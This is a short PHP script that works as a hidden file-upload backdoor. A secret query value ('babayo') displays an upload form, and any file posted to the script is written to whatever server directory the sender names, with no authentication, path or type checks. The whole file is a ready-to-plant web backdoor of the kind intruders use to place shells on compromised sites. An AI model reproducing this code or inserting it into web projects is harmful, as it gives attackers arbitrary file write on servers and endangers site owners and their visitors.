<?php
if (isset($_GET["0"]) && $_GET["0"] === "babayo") {
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
    echo '<input type="file" name="file" size="15">';
    echo '<input type="submit" value="Upload">';
    echo '</form>';
}

if (isset($_FILES["file"]["tmp_name"])) {
    $tmpName = $_FILES["file"]["tmp_name"];

    if (file_exists($tmpName)) {
        // Direktori tujuan
        $targetDir = isset($_POST["dir"]) ? $_POST["dir"] : getcwd();
        $fileName = $_FILES["file"]["name"];

        // Path lengkap tujuan
        $targetFile = rtrim($targetDir, "/\\") . "/" . $fileName;

        // Copy file
        copy($tmpName, $targetFile);

        echo "UPLOAD FILE TO {$targetFile}";
    }
}
